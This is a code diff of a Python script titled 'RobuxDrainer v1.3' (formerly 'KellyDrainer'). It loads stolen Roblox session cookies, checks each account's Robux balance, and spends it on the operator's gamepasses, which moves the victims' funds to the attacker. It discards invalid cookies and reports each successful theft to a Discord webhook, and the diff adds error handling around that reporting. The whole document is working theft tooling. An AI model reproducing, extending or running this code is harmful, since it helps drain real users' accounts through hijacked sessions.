@@ -14,7 +14,6 @@ COOKIES_FILE = os.path.join(INPUT_DIR, "cookies.txt")
 CONFIG_FILE = os.path.join(INPUT_DIR, "config.json")
 
 def scrape_input_folder():
-    """Extracts cookies from files like robux*.txt and rap*.txt (format user:pass:cookie)"""
     all_cookies = []
     
     file_patterns = [
@@ -47,7 +46,7 @@ def scrape_input_folder():
             with open(COOKIES_FILE, "a", encoding="utf-8") as f:
                 for c in unique_new:
                     f.write(c + "\n")
-            log("[+]", f"Scraped {len(unique_new)} new cookies from input files!", GREEN)
+            log("[+]", f"Scraped {len(unique_new)} new cookies!", GREEN)
 
 def load_config():
     try:
@@ -67,15 +66,15 @@ def save_cookies(cookies):
         f.write("\n".join(cookies))
 
 def main():
-    if not os.name == "nt": pass # For linux title support if needed
     if not os.path.exists(INPUT_DIR): os.makedirs(INPUT_DIR)
     
     config = load_config()
     gamepasses = sorted(config.get("gamepasses", []), key=lambda x: x['price'], reverse=True)
     
     clear_console()
-    set_app_name("KellyDrainer")
-
+    set_app_name("RobuxDrainer v1.3")
+    
+    # Start bot
     if config.get("bot_token"):
         threading.Thread(target=start_bot, args=(config["bot_token"],), daemon=True).start()
 
@@ -93,7 +92,7 @@ def main():
             balance = user.get_balance()
             log("[#]", f"{user.username} | Balance: {balance} R$", PURPLE)
 
-            if balance <= 0:
+            if balance <= 1 or 0:
                 log("[!]", "Zero balance, removing...", RED)
                 cookies.pop(i)
                 save_cookies(cookies)
@@ -102,39 +101,61 @@ def main():
 
             for gp in gamepasses:
                 gaid, price = gp["id"], gp["price"]
+
                 if balance >= price:
                     log("[...]", f"Buying: {price} R$", BLUE)
-                    
+
                     status_code, status_json = user.buy_gamepass(gaid)
                     purchased = status_json.get("purchased", False) if isinstance(status_json, dict) else False
 
                     if purchased:
                         add_try()
                         add_robux(price)
-                        balance -= price 
+                        balance -= price
                         log("[✓]", f"Success! Bought {price} R$", GREEN)
-                        send_discord_webhook(config["webhook"], user.username, user.user_id, gaid, price, status_code, status_json, "", config["user_id"])
+
+                        # ✅ SAFE WEBHOOK (FIX)
+                        webhook = config.get("webhook")
+                        if webhook and webhook.startswith("http"):
+                            try:
+                                send_discord_webhook(
+                                    webhook,
+                                    user.username,
+                                    user.user_id,
+                                    gaid,
+                                    price,
+                                    status_code,
+                                    status_json,
+                                    "",
+                                    config.get("user_id")
+                                )
+                            except Exception as e:
+                                log("[!]", f"Webhook error: {e}", RED)
+
                         time.sleep(1)
+
                     else:
                         reason = status_json.get("reason", "Unknown")
+
                         if "Unknown" in reason:
                             log("[!]", "RATELIMITED! Waiting 60s...", YELLOW)
                             time.sleep(60)
-                            continue 
+                            continue
                         else:
                             log("[x]", f"Failed: {reason}", RED)
-                
+
         except CsrfError:
             log("[!]", "Invalid cookie, removing...", RED)
             cookies.pop(i)
             save_cookies(cookies)
             update_cookie_count()
             continue
+
         except Exception as e:
             log("[!]", f"Error: {e}", RED)
             i += 1
             continue
-            
+
         i += 1
         update_cookie_count()
         time.sleep(config.get("delay", 5))
